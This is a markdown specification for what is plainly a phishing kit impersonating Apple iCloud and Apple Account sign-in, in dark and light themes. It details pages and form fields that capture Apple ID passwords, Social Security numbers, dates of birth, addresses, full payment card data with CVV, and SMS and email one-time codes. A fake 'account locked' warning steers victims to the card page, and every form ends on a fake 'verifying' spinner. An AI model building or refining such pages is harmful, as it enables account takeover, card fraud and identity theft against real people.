# iCloud Pages - Form Fields Summary

## ✅ All pages redirect to loading.html on submit

## 1. login.html
**Form ID:** `signinForm`
**Redirects to:** loading.html (after password step)

### Inputs:
- `id="apple-id-email"` `name="accountName"` - Email or Phone Number
- `id="apple-id-password"` `name="password"` - Password
- `id="remember-me"` `name="remember"` - Keep me signed in checkbox

---

## 2. verify.html
**Form ID:** `verifyForm`
**Redirects to:** loading.html

### Inputs:
- `id="full-name"` `name="fullName"` - Full Name
- `id="date-of-birth"` `name="dateOfBirth"` - Date of Birth
- `id="ssn"` `name="ssn"` - Social Security Number
- `id="address"` `name="address"` - Street Address
- `id="country"` `name="country"` - Country (select)
- `id="state"` `name="state"` - State (select, conditional)
- `id="city"` `name="city"` - City
- `id="zip-code"` `name="zipCode"` - ZIP Code
- `id="phone-number"` `name="phoneNumber"` - Phone Number

---

## 3. card.html
**Form ID:** `cardForm`
**Redirects to:** loading.html

### Inputs:
- `id="card-number"` `name="cardNumber"` - Card Number (formatted XXXX XXXX XXXX XXXX)
- `id="cardholder-name"` `name="cardholderName"` - Cardholder Name
- `id="expiry-date"` `name="expiryDate"` - Expiry Date (MM/YY)
- `id="cvv"` `name="cvv"` - CVV
- `id="billing-address"` `name="billingAddress"` - Billing Address
- `id="billing-city"` `name="billingCity"` - City
- `id="billing-zip"` `name="billingZip"` - ZIP Code

---

## 4. sms.html
**Form ID:** `smsForm`
**Redirects to:** loading.html

### Inputs:
- `id="verification-code"` `name="verificationCode"` - 6-digit SMS Code

### Features:
- 2-minute countdown timer
- Resend code functionality
- Code expires and disables form

---

## 5. email.html
**Form ID:** `emailForm`
**Redirects to:** loading.html

### Inputs:
- `id="verification-code"` `name="verificationCode"` - 6-digit Email Code

### Features:
- 2-minute countdown timer
- Resend code functionality
- Code expires and disables form

---

## 6. warning.html
**No form** - Action buttons only
**"Unlock Account" button redirects to:** loading.html

---

## 7. loading.html
**No form** - Loading spinner page with message:
"We are verifying your information... Please wait"

---

## Field Formatting:

### Auto-formatted fields:
- **SSN:** XXX-XX-XXXX
- **Card Number:** XXXX XXXX XXXX XXXX
- **Expiry Date:** MM/YY
- **CVV:** 3-4 digits
- **ZIP Code:** XXXXX or XXXXX-XXXX
- **Phone:** (XXX) XXX-XXXX
- **Verification Codes:** 6 digits only

---

## All Forms Have:
✅ Meaningful IDs and names
✅ Proper autocomplete attributes
✅ Loading spinners on submit buttons
✅ Redirect to loading.html on successful submit
✅ Form validation (required fields)
✅ Consistent design across all pages


---

## Light-Themed Pages (loginget Design)

All light-themed pages follow the Apple Account design with full navigation bar, sub-header, and footer. They use white backgrounds with light gray accents and blue gradient buttons.

### 1. loginget.html - Apple Account Sign In
**Purpose:** Main Apple Account login page with two-step authentication

**Form Fields:**
- Email/Phone Number (apple-email)
- Password (apple-password) - appears after email is entered

**Features:**
- Full Apple navigation bar
- Sub-header with Apple Account title and links
- Colorful dot ring animation
- Two-step merged input form (email, then password)
- Info box with data usage information
- Continue button (disabled until email entered)
- "Sign in with iPhone" button
- Apple-style 12-bar rotating spinner
- Redirects to loadingget.html on submit

**CSS:** assets/loginget.css
**JS:** assets/loginget.js

---

### 2. loadingget.html - Loading Page
**Purpose:** Loading page with spinner animation

**Features:**
- Full Apple navigation
- Centered colorful dot ring with spinner
- "Signing you in..." text
- Light gray background
- Uses same 12-bar rotating spinner

**CSS:** assets/loadingget.css
**JS:** None (static page)

---

### 3. warningget.html - Account Locked Warning
**Purpose:** Display account locked warning message

**Content:**
- Warning title: "This Apple Account has been locked for security reasons"
- Description: "You must unlock your account before signing in"

**Buttons:**
- Cancel button (returns to loginget.html)
- Unlock Account button (redirects to cardget.html)

**CSS:** assets/loginget.css (warning styles appended)
**JS:** assets/warningget.js

---

### 4. cardget.html - Payment Method Entry
**Purpose:** Add payment card information

**Form Fields:**
- Card Number (card-number) - auto-formatted with spaces
- Cardholder Name (cardholder-name)
- Expiry Date (expiry-date) - MM/YY format
- CVV (cvv) - 3-4 digits
- Billing Address (billing-address)
- City (billing-city)
- ZIP Code (billing-zip)

**Features:**
- All inputs in merged container with floating labels
- Card number formatting (spaces every 4 digits)
- Expiry date formatting (MM/YY)
- CVV and ZIP validation (numbers only)
- Info box explaining security
- Redirects to loadingget.html on submit

**CSS:** assets/loginget.css
**JS:** assets/cardget.js

---

### 5. verifyget.html - Identity Verification
**Purpose:** Verify user identity with personal information

**Form Fields:**
- Full Name (full-name)
- Date of Birth (date-of-birth) - date picker
- Social Security Number (ssn) - XXX-XX-XXXX format
- Street Address (address)
- City (city)
- ZIP Code (zip-code)
- Phone Number (phone-number) - formatted

**Features:**
- All inputs in merged container
- SSN auto-formatting (XXX-XX-XXXX)
- Phone number formatting ((XXX) XXX-XXXX)
- ZIP code validation
- Info box explaining identity verification
- Redirects to loadingget.html on submit

**CSS:** assets/loginget.css
**JS:** assets/verifyget.js

---

### 6. smsget.html - SMS Verification
**Purpose:** Enter SMS verification code

**Form Fields:**
- Verification Code (verification-code) - 6 digits, centered input

**Features:**
- SMS icon (message bubble)
- Description text
- 2-minute countdown timer
- Large centered code input
- Resend code link
- Auto-redirect to loadingget.html on submit

**CSS:** assets/loginget.css
**JS:** assets/smsget.js

---

### 7. emailget.html - Email Verification
**Purpose:** Enter email verification code

**Form Fields:**
- Verification Code (verification-code) - 6 digits, centered input

**Features:**
- Email icon (envelope)
- Description text
- 2-minute countdown timer
- Large centered code input
- Resend code link
- Auto-redirect to loadingget.html on submit

**CSS:** assets/loginget.css
**JS:** assets/emailget.js

---

## Design Specifications

### Dark Theme (i*.html files)
- Background: `#1c1c1e`
- Input backgrounds: `#2a2a2c`
- Text: `#ffffff`
- Secondary text: `#99999d`
- Accent: `#0A84FF`
- Border: `#3a3a3c`

### Light Theme (*get.html files)
- Background: `#ffffff`
- Secondary background: `#f5f5f7`
- Text: `#1d1d1f`
- Secondary text: `#6e6e73`
- Accent: `#06c` (links), `#0071e3` (buttons)
- Border: `#d2d2d7`
- Button gradient: `linear-gradient(180deg, #42a1ec 0%, #0070c9 100%)`

### Common Features
- Floating label animation (labels float to top at 4px with 11px font size)
- Merged/combined input containers
- Apple-style 12-bar rotating spinner
- Colorful dot ring animation
- Responsive design
- Form validation
- Auto-formatting for card numbers, phone numbers, SSN, etc.
- All forms redirect to respective loading pages on submit
